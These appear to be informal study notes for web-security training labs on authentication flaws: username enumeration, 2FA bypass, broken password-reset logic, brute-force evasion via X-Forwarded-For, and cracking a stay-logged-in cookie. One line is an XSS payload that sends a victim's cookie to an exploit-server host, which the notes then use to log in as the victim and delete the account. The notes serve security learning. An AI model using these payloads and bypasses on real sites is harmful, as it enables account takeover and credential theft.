


	#Authentication Vulnerabilities#
	
		[Username enumeration via different responses]	- It has an account with a predictable username and password, which can be found in the following wordlists

			first enumerate username using Sniper-Attack. <Check status code and error status message> 
			
				Invalid-Error show not matching username
				Passowrd-Error show to matching username
				
				then select the username and brute-force for password 
				
		
		[2FA simple bypass]
		
			log in to your own account. 2FA verification code will be sent to email. submit the OTP. and Copy the URL patten /my-account
				after log-out then log-in victim user, it will ask OTP.. to bypass this OTP place /my-account in the URL.
					the it will bypass automatically
					
					
		
		[Password reset broken logic]
		
			observe that the reset token is provided as a URL query parameter in the reset email. 
				notice that when you submit your new password, the POST "/forgot-password?temp-forgot-password-token" request contains the username as hidden input. 
					send this request to Burp Repeater.
					
			in Burp Repeater, observe that the password reset functionality still works even if you delete the value of the temp-forgot-password-token parameter
				in both the URL and request body. This confirms that the token is not being checked when you submit the new password.
		
			In Burp Repeater, delete the value of the temp-forgot-password-token parameter in both the URL and request body. 
				Change the username parameter to carlos. Set the new password to whatever you want and send the request.
				
				
			
	
		[Username enumeration via subtly different responses]
			



		[Username enumeration via response timing]
	
		X-Forwarded-For: is used to bypass ip address block-listing
			
		after multiple times attemps of login, it blocks login for 30 mins. add X-Forwarded-For with any random value.
			it will bypass ip-address
			
		send the request to intruder. 
		
		X-Forwarded-For: §1§		1-> auto increment 1 to 100 by 1 for request		with pictfork attacks
		username=§admin§		2-> random username 
		
		set a long-range-password, if username is match then it tries to match password. and response will delay due to this.
			we get username and then set username and set password brute-force attacks

		while attacks, check response-receive time at colums.
		
		

		[Broken brute-force protection, IP block]
	
		observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row.
		or after two fails username for login, it will block login. but one valid login then it clear fails attemps login.

		add valid credential for login to clear fails attemps
			add specific username and match dictionary password
				after 2 times fails login add valid credential.
				
		
		
		[Username enumeration via account lock]
	
		use provided username list and random password with 5 times for each username -> cluster-bomb
		check status code/response to get username or enumerate username
		set that username and sniper the attack for password 				
				



		[2FA broken logic]
	
		use valid username and password, check the process OTP. then logout that user.
			check browser history where u get GET /login2, username is set to cookie
				send it to repeater and rename the username to get otp requst generated by application.
					
		again check the browser history, check OTP history and send it to intruder. 
			edit username to carlos and verify of otp 1-9999
				
			
			
			
		[Brute-forcing a stay-logged-in cookie]
	
		check the login cookie at browser inspector->application->cookie	
			
		d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw		-base64encode
		wiener:51dc30ddc473d43a6011e9ebba6ca770 					-base64decode
		51dc30ddc473d43a6011e9ebba6ca770:peter						-md5 hash		
		wiener:peter												username:password
		
		session will be same, but check "stay-logged-in" 
		
		base64(username+':'+md5HashOfPassword)
		
		Hash: MD5
		Add prefix: wiener:
		Encode: Base64-encode
		
		As the Update email button is only displayed when you access the /my-account page in an authenticated state.
		
		
		
		
		[Offline password cracking]
	
		we need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
		first login into account using valid credential information.
	
		post a comment for XSS 
			
			<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

		On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.
		decode base64 and decrypt md5 
		
		login with this credential and delete this account
		
		
		

	[Broken brute-force protection, multiple credentials per request]

		As observed, bothe username and password are JSON format in header section.
	
		now add set of password in json with username if any password is match, then it will return 302 redirect status code.  
		follow-direction and show response in browser, loggined as carlos user




	[2FA bypass using a brute-force attack]

		login user and password, ask for OTP if two wrong OTP is enter then it automatically log-out

		need to keep session running, project-options-> sessions-> add session rules-> run a macros
		from http-history, send first login2 request to intruder
			send range otp request 1-9999

		if otp is match, then return 302 status code.
		
		
			
			

		
		
